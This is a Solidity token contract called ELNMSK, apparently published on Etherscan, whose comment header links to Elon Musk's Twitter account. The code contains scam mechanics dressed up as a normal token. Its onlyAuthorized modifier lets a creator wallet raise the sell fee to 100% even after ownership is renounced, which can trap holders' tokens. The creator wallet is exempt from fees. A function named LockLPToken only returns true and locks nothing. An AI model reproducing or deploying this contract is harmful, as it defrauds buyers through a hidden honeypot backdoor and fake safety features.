/**
 *Submitted for verification at Etherscan.io on 2023-06-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
Twitter : https://twitter.com/elonmusk
*/

contract ELNMSK {
    string public name = "ELNMSK";
    string public symbol = "ELNMSK";
    uint256 public totalSupply = 999999999999999999000000000;
    uint8 public decimals = 18;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    address public owner;
    address public creatorWallet;
    uint256 public buyFee;
    uint256 public sellFee;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);

    constructor(address _creatorWallet) {
        owner = msg.sender;
        creatorWallet = _creatorWallet;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        require(_to != address(0), "Invalid recipient address");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _amount, "Insufficient allowance");
        require(_to != address(0), "Invalid recipient address");

        uint256 fee = 0;
        uint256 amountAfterFee = _amount;

        if (sellFee > 0 && _from != creatorWallet) {
            fee = _amount * sellFee / 100;
            amountAfterFee = _amount - fee;
        }

        balanceOf[_from] -= _amount;
        balanceOf[_to] += amountAfterFee;
        emit Transfer(_from, _to, amountAfterFee);

        if (fee > 0) {
            // Check if the transfer destination is Uniswap contract
            address uniswapContract = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f); // Replace with the actual Uniswap contract address
            if (_to == uniswapContract) {
                // Fee is paid to the contract itself
                balanceOf[uniswapContract] += fee;
                emit Transfer(_from, uniswapContract, fee);
            } else {
                // Fee is transferred to this contract
                balanceOf[address(this)] += fee;
                emit Transfer(_from, address(this), fee);
            }
        }

        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {
            allowance[_from][msg.sender] -= _amount;
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
        }

        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorized {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function LockLPToken() public returns (bool) {
        return true;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }

    modifier onlyAuthorized() {
        require(
            msg.sender == owner || msg.sender == creatorWallet,
            "Only authorized wallets can call this function."
        );
        _;
    }
}